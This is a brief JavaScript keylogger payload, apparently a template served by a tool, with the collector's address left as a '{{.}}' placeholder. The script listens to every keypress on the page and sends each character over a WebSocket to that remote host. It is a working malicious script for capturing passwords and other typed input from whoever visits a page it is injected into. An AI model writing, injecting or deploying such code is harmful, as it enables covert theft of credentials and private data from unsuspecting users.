(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
